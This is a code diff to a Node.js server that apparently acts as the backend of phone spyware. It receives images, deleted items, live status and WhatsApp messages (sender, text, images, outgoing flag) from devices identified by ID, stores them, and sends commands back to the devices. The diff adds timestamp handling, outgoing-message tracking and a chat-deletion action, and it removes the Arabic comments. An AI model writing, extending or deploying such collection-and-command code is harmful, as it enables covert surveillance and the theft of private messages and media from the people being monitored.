@@ -22,7 +22,6 @@ app.post('/upload.php', (req, res) => {
     try {
         const data = req.body;
         
-        // ✅ حفظ الصور
         if (data.type === 'image_data' && data.file_data) {
             const deviceId = data.device_id || 'unknown';
             const deviceDir = path.join(dataDir, deviceId);
@@ -37,7 +36,6 @@ app.post('/upload.php', (req, res) => {
             return res.json({ success: true, images_count: imagesData.length });
         }
         
-        // ✅ حفظ المحذوفات
         if (data.type === 'deleted_data') {
             const deviceId = data.device_id || 'unknown';
             const deviceDir = path.join(dataDir, deviceId);
@@ -62,7 +60,6 @@ app.post('/upload.php', (req, res) => {
             return res.json({ success: true, deleted_count: deleted.length });
         }
         
-        // ✅ حفظ رسائل واتساب مع الصور
         if (data.type === 'whatsapp_message') {
             const deviceId = data.device_id || 'unknown';
             const deviceDir = path.join(dataDir, deviceId);
@@ -72,13 +69,25 @@ app.post('/upload.php', (req, res) => {
             let waMessages = [];
             if (fs.existsSync(waFile)) waMessages = JSON.parse(fs.readFileSync(waFile, 'utf8'));
             
+            // ✅ تحويل التاريخ إلى milliseconds
+            let waTimestamp = Date.now();
+            if (data.timestamp) {
+                try {
+                    const parsedDate = new Date(String(data.timestamp).replace(' ', 'T'));
+                    if (!isNaN(parsedDate.getTime())) {
+                        waTimestamp = parsedDate.getTime();
+                    }
+                } catch (e) {}
+            }
+            
             waMessages.push({
                 sender: data.sender || 'غير معروف',
                 message: data.message || '',
-                timestamp: data.timestamp || Date.now(),
+                timestamp: waTimestamp,
                 is_group: data.is_group || false,
                 message_type: data.message_type || 'text',
-                image_data: data.image_data || null
+                image_data: data.image_data || null,
+                is_outgoing: data.is_outgoing || false
             });
             
             if (waMessages.length > 5000) waMessages = waMessages.slice(-5000);
@@ -88,7 +97,6 @@ app.post('/upload.php', (req, res) => {
             return res.json({ success: true, wa_count: waMessages.length });
         }
         
-        // ✅ البيانات العادية
         const deviceId = data.device_id || 'unknown';
         const deviceDir = path.join(dataDir, deviceId);
         if (!fs.existsSync(deviceDir)) { fs.mkdirSync(deviceDir, { recursive: true }); fs.mkdirSync(path.join(deviceDir, 'files'), { recursive: true }); }
@@ -144,7 +152,6 @@ app.post('/upload.php', (req, res) => {
     } catch (e) { res.json({ error: e.message }); }
 });
 
-// ============ حالة حية ============
 app.post('/live_update.php', (req, res) => {
     try {
         const data = req.body;
@@ -164,7 +171,6 @@ app.post('/live_update.php', (req, res) => {
     } catch (e) { res.json({ error: e.message }); }
 });
 
-// ============ البيانات الحية ============
 app.get('/live.php', (req, res) => {
     try {
         const deviceId = req.query.device;
@@ -207,7 +213,6 @@ app.get('/live.php', (req, res) => {
     } catch (e) { res.json({ error: e.message }); }
 });
 
-// ============ API ============
 app.get('/api.php', (req, res) => {
     try {
         const action = req.query.action;
@@ -250,6 +255,19 @@ app.get('/api.php', (req, res) => {
             return res.json([]);
         }
         
+        // ✅ حذف دردشة واتساب كاملة
+        if (action === 'delete_whatsapp_chat') {
+            const sender = req.query.sender;
+            const waFile = path.join(dataDir, deviceId, 'whatsapp_messages.json');
+            if (fs.existsSync(waFile) && sender) {
+                let messages = JSON.parse(fs.readFileSync(waFile, 'utf8'));
+                messages = messages.filter(m => m.sender !== sender);
+                fs.writeFileSync(waFile, JSON.stringify(messages, null, 2));
+                return res.json({ success: true });
+            }
+            return res.json({ success: false });
+        }
+        
         if (action === 'get_whatsapp') {
             const waFile = path.join(dataDir, deviceId, 'whatsapp_messages.json');
             if (fs.existsSync(waFile)) return res.json(JSON.parse(fs.readFileSync(waFile, 'utf8')));
@@ -286,7 +304,6 @@ app.get('/api.php', (req, res) => {
     } catch (e) { res.json({ error: e.message }); }
 });
 
-// ============ أوامر ============
 app.post('/api.php', (req, res) => {
     try {
         const { device, command } = req.body;
@@ -302,7 +319,6 @@ app.post('/api.php', (req, res) => {
     } catch (e) { res.json({ error: e.message }); }
 });
 
-// ============ أجهزة ============
 app.get('/devices.json', (req, res) => {
     try { res.json(JSON.parse(fs.readFileSync(devicesFile, 'utf8'))); } catch (e) { res.json([]); }
 });
